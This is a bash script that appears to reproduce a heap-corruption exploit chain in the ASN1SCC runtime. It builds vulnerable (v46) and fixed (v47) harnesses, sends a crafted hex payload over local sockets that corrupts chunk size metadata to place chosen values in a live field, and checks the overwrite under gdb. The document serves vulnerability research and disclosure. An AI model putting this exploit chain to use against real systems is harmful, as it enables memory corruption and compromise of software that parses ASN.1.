#!/usr/bin/env bash
# Consume the corrupted live heap metadata: corrupted B size -> overlapping
# allocation -> chosen value in a live ASN1SCC Payload field.
# Expects `bash run.sh run` first (pinned runtimes + compiler under ./run).
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$HERE/run
cd "$HERE" || exit 2

mkdir -p "$OUT/gen-v17"
printf 'TEST DEFINITIONS ::= BEGIN\nPayload ::= OCTET STRING (SIZE(0..17))\nEND\n' \
  > "$OUT/gen-v17/schema.asn"
(cd "$OUT/gen-v17" && ../build/asn1scc/asn1scc -c -uPER schema.asn) \
  > "$OUT/codegen-chain.log" 2>&1 || exit 2

INC="-I$OUT/gen-v17 -I$OUT/build/v46/asn1crt"
gcc -g -O0 -Wall $INC "$HERE/heap-chain.c" "$OUT/gen-v17/schema.c" \
  "$OUT/build/v46/asn1crt/"*.c -o "$OUT/heap_chain_v46" || exit 2
FIX="-I$OUT/gen-v17 -I$OUT/build/v47/asn1crt"
gcc -g -O0 -Wall $FIX "$HERE/heap-chain.c" "$OUT/gen-v17/schema.c" \
  "$OUT/build/v47/asn1crt/"*.c -o "$OUT/heap_chain_v47" || exit 2

HEX="$(printf '00%.0s' $(seq 1 20))41$(printf '00%.0s' $(seq 1 10))"
round() {
  local bin=$1 port=$2 tag=$3
  "$bin" server "$port" 31 "$HEX" > "$OUT/heap-chain-${tag}.log" 2>&1 &
  local srv=$!
  sleep 0.3
  "$bin" client "$port" 31 "$HEX" >> "$OUT/heap-chain-${tag}.log" 2>&1
  wait "$srv"
  echo "=== $tag (rc=$?) ==="
  cat "$OUT/heap-chain-${tag}.log"
  echo
}

echo "### gdb watchpoint on live C->nCount during the overlap store ###"
gdb -q -batch -x "$HERE/watch-chain.gdb" \
  --args "$OUT/heap_chain_v46" server 39273 31 "$HEX" \
  > "$OUT/gdb-chain.log" 2>&1 &
local_gdb=$!
sleep 1.5
"$OUT/heap_chain_v46" client 39273 31 "$HEX" >> "$OUT/gdb-chain.log" 2>&1
wait "$local_gdb"
grep -E 'BREAK:|C before|WATCH HIT|heap-chain.c:|C after' "$OUT/gdb-chain.log"
round "$OUT/heap_chain_v46" 39271 vulnerable
round "$OUT/heap_chain_v47" 39272 fixed_control
